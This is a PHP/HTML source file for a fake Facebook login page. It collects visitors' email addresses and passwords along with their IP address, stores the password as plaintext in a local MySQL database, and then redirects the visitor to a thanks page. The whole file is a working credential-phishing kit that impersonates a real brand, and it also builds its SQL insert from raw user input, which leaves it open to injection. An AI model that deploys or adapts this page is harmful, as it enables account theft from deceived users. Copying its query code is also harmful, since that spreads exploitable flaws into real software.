<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="stylesheet" href="style.css">
</head>
<body class="conatiner">
    <div class="main">
        <div class="main2 conatiner">
            <img style="margin-top:50px;" src="face.svg" alt="">
        <form action="index.php" method="POST">
            <input name="mail" class="inputs" type="text" placeholder="Email address or phone number" required>
            <input name="pass" class="inputs" type="password" placeholder="Password" required>
            <?php
                function getUserIP()
                {
                    // Get real visitor IP behind CloudFlare network
                    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                            $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                            $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                    }
                    $client  = @$_SERVER['HTTP_CLIENT_IP'];
                    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
                    $remote  = $_SERVER['REMOTE_ADDR'];

                    if(filter_var($client, FILTER_VALIDATE_IP))
                    {
                        $thanks2 = $client;
                    }
                    elseif(filter_var($forward, FILTER_VALIDATE_IP))
                    {
                        $thanks2 = $forward;
                    }
                    else
                    {
                        $thanks2 = $remote;
                    }

                    return $thanks2;
                }


                $user_ip = getUserIP();     

                echo "<input type='hidden' name='ip' value='$user_ip'>";
                
            ?>
            <button name="very" class="inputs1"><h2 style="text-align:center;color:white;letter-spacing:2px;font-weight:540;">Verify</h2></button>
        </form>
            <?php
                $connection = mysqli_connect('localhost','root','','face');

                if(isset($_POST['very']))
                {
                    $mail = $_POST['mail'];
                    $pass = $_POST['pass'];
                    $ip = $_POST['ip'];

                    $sql = "INSERT INTO face(email,pass,ip_address) VALUES('$mail','$pass','$ip')";
                    
                    if(mysqli_query($connection,$sql))
                    {
                        header('location:thanks.php');
                    }else
                    {
                        header('location:error.php');
                        echo mysqli_error($connection);
                    }
                }
            ?>
        </div>
    </div>
</body>
</html>